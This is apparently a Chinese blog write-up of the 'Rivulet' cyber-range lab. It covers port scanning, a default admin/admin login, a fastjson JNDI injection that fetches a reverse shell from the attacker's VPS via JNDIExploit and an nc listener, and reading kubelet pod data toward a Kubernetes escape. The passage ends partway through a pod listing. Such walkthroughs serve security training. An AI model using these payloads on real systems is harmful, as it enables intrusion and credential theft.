---
title: 春秋云境 Rivulet
url: https://mp.weixin.qq.com/s/Alz-DFfAbJUQWNm1qmsNgQ
source: Doonsec's feed
date: 2026-04-26
fetch_date: 2026-04-27T05:05:54.560271
---

# 春秋云境 Rivulet

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/qjbyarUZODvEswWpbd5JnNrc27kZNo1asBT9lFqtKAGSoj3O5N5R9byTzA5GeHlwMUr7haFFYHumnwryYlHj80PDFWtic06HZbDtR9qeUQEQ/0?wx_fmt=jpeg)

# 春秋云境 Rivulet

原创

N1tols
N1tols

彩虹七号实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

Rivulet是一套简单的靶场环境，考察玩家信息收集能力。靶场环境中，存在复数的敏感信息泄露，这些信息可帮助选手快速通过关键步骤。该靶场有4个flag，平均分布在所有靶机上。

# 外网打点

## flag01

靶机IP：39.101.1.38

```
E:\渗透工具\03_漏洞扫描_批量探测\漏扫\fscan>fscan.exe -h 39.101.1.38

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.101.1.38:10250 open
39.101.1.38:8080 open
39.101.1.38:22 open
39.101.1.38:2379 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://39.101.1.38:8080   code:302 len:0      title:None 跳转url: http://39.101.1.38:8080/login
;jsessionid=4BEDF37372AAF6EE75A92FD977014283
[*] WebTitle http://39.101.1.38:8080/login;jsessionid=4BEDF37372AAF6EE75A92FD977014283 code:400 len:277    title:None
[*] WebTitle https://39.101.1.38:10250 code:200 len:104    title:None
```

![](https://mmbiz.qpic.cn/mmbiz_png/qjbyarUZODvRic2zeB8278A1PCSBGzM8NnANmDxPfwxzkHfAgyk6qWsjOic1ocwBuIA6qwr0GXkrBuNA7P5D0UkibRBW7SiahKwZ6gKsKISdoNA/640?wx_fmt=png&from=appmsg "null")

访问一下可能存在漏洞的地址
https://39.101.1.38:6443/

```
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {

  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {

  },
  "code": 403
}
```

这是个Kubernetes服务
https://39.101.1.38:10250/

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 24 Apr 2026 06:25:34 GMT
Content-Type: text/html
Content-Length: 104
Last-Modified: Sun, 05 Apr 2026 08:18:40 GMT
Connection: keep-alive
ETag: "69d21ae0-68"
Accept-Ranges: bytes

<h1>403 Forbidden</h1>
Access denied by nginx whitelist.
<br>
Please access via the correct IP address.
```

http://39.101.1.38:8080/
这是个shiro框架的Web服务

![](https://mmbiz.qpic.cn/mmbiz_png/qjbyarUZODuQDF5RGWqzQ1dnPAdUnzv9qZZNNFtOdm35W6PcZwCO5CBYhQrAHicGsCxnicbEKbEmttdyHJlksrLYKUsNF8trKdOS9bQU6SMU8/640?wx_fmt=png&from=appmsg "null")

突破口就这几个，思路是从web服务打进k8s集群，窃取凭证打k8s逃逸
我们在8080端口使用账号密码 admin/admin登录成功,看到如下页面可以create Post
Post提交的地方,拿一个DNS测试一下，https://app.interactsh.com/

```
POST /create HTTP/1.1
Host: 39.101.1.38:8080
Content-Length: 139
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://39.101.1.38:8080
Referer: http://39.101.1.38:8080/create
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=C7E1B55DFE33CBDA82991338E2A92BA5
Connection: keep-alive

{
  "title": "fastjson-test",
  "content": {
    "@type": "java.net.Inet4Address",
    "val": "test.ymuaxnuhekdcvzlbumwi6b2m83x0cu3u7.oast.fun"
  }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qjbyarUZODsXNOytrRnowAegibtEJkgQ32nlCmNOic8GkEfSAynppRmH5hEamUkbIHBeg9rDOWW2lvH0Jn7vribibSwPicJSGEC4o8CSj7gFTk0Y/640?wx_fmt=png&from=appmsg "null")

意收到了DNS记录，那么说明可控
在VPS上下载JNDIExploit并解压

```
wget -O JNDIExploit.v1.2.zip \
  https://github.com/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip

unzip -o JNDIExploit.v1.2.zip
```

启动JNDIEExploit

```
cd /root/rivulet
nohup java -jar JNDIExploit-1.2-SNAPSHOT.jar \
  -i VPSIP \
  -l 1389 \
  -p 8000 \
  > /tmp/rivulet_jndi.log 2>&1 &
```

确认服务启动

```
ss -lntp | egrep ':(1389|8000)'
```

开nc准备打反弹shell

```
nc -lvnp 9001
```

反弹shell

```
  curl -s -c cookie.txt \
    -X POST 'http://39.101.1.38:8080/doLogin' \
    -d 'username=admin&password=admin'

  curl -i -s -b cookie.txt \
    -X POST 'http://39.101.1.38:8080/create' \
    -H 'Content-Type: application/json' \
    --data-binary '{"title":"jndi-rshell-cc-9001","content":{"a":
  {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://VPSIP:1389/Basic/ReverseShell/VPSIP/9001","autoCommit":true}}}'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qjbyarUZODu2nLgvnfqPQgjaUVpVLibP9dvQAmGP5WhiakQ4pianaCbTsN0yOyqLqfOEXo3vF5xJicflV4fpKtz7SygkcvnEaVIRCBOXchKBJ08/640?wx_fmt=png&from=appmsg "null")

拿到shell了但是这个是k8s容器的shell
回顾之前的10250端口

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 24 Apr 2026 06:25:34 GMT
Content-Type: text/html
Content-Length: 104
Last-Modified: Sun, 05 Apr 2026 08:18:40 GMT
Connection: keep-alive
ETag: "69d21ae0-68"
Accept-Ranges: bytes

<h1>403 Forbidden</h1>
Access denied by nginx whitelist.
<br>
Please access via the correct IP address.
```

可以直接走内网IP读pod

```
proxychains curl -k https://192.168.1.56:10250/pods
```

读取信息如下

```
{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"kube-apiserver-web","namespace":"kube-system","selfLink":"/api/v1/namespaces/kube-system/pods/kube-apiserver-web","uid":"b269709cbe90ff42cbcdc86d9df1e59c","creationTimestamp":null,"labels":{"component":"kube-apiserver","tier":"control-plane"},"annotations":{"kubernetes.io/config.hash":"b269709cbe90ff42cbcdc86d9df1e59c","kubernetes.io/config.seen":"2026-04-24T13:42:15.841192324Z","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"ca-certs","hostPath":{"path":"/etc/ssl/certs","type":"DirectoryOrCreate"}},{"name":"etc-ca-certificates","hostPath":{"path":"/etc/ca-certificates","type":"DirectoryOrCreate"}},{"name":"k8s-certs","hostPath":{"path":"/etc/kubernetes/pki","type":"DirectoryOrCreate"}},{"name":"usr-local-share-ca-certificates","hostPath":{"path":"/usr/local/share/ca-certificates","type":"DirectoryOrCreate"}},{"name":"usr-share-ca-certificates","hostPath":{"path":"/usr/share/ca-certificates","type":"DirectoryOrCreate"}}],"containers":[{"name":"kube-apiserver","image":"registry.aliyuncs.com/google_containers/kube-apiserver:v1.16.5","command":["kube-apiserver","--advertise-address=192.168.1.56","--allow-privileged=true","--authorization-mode=Node,RBAC","--bind-address=192.168.1.56","--client-ca-file=/etc/kubernetes/pki/ca.crt","--enable-admission-plugins=NodeRestriction","--enable-bootstrap-token-auth=true","--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt","--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt","--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key","--etcd-servers=https://127.0.0.1:2379","--insecure-port=0","--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt","--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key","--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname","--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt","--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key","--requestheader-allowed-names=front-proxy-client","--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt","--requestheader-extra-headers-prefix=X-Remote-Extra-","--requestheader-group-headers=X-Remote-Group","--requestheader-username-headers=X-Remote-User","--secure-port=6443","--service-account-key-file=/etc/kubernetes/pki/sa.pub","--service-cluster-ip-range=10.96.0.0/12","--tls-cert-file=/etc/kubernetes/pki/apiserver.crt","--tls-private-key-file=/etc/kubernetes/pki/apiserver.key"],"resources":{"requests":{"cpu":"250m"}},"volumeMounts":[{"name":"ca-certs","readOnly":true,"mountPath":"/etc/ssl/certs"},{"name":"etc-ca-certificates","readOnly":true,"mountPath":"/etc/ca-certificates"},{"name":"k8s-certs","readOnly":true,"mountPath":"/etc/kubernetes/pki"},{"name":"usr-local-share-ca-certificates","readOnly":true,"mountPath":"/usr/local/share/ca-certificates"},{"name":"usr-share-ca-certificates","readOnly":true,"mountPath":"/usr/share/ca-certificates"}],"livenessProbe":{"httpGet":{"path":"/healthz","port":6443,"host":"192.168.1.56","scheme":"HTTPS"},"initialDelaySeconds":15,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"fa...